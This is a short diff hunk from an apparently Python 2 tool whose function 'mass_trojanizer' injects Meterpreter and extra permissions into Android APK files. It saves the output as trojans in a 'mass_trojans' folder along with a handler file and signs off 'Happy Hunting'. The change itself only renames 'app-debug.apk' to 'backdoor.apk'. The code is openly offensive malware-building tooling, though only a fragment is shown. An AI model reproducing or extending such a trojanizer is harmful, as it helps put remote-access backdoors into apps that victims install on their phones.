@@ -198,7 +198,7 @@ def mass_trojanizer(): # Mass trojanizer module
 		inyeccion_permisos()
 		integracion_meterpreter()
 		remove_tmp_meterpreter()
-		os.system("mv "+pwd+"/app-debug.apk "+pwd+"/mass_trojans/"+apk_name)
+		os.system("mv "+pwd+"/backdoor.apk "+pwd+"/mass_trojans/"+apk_name)
 		print "[*] => "+pwd+"/mass_trojans/"+apk_name+" created!"
 	print "[*] handler saved in => "+pwd+"/handler.rc"
 	print "[*] Happy Hunting"
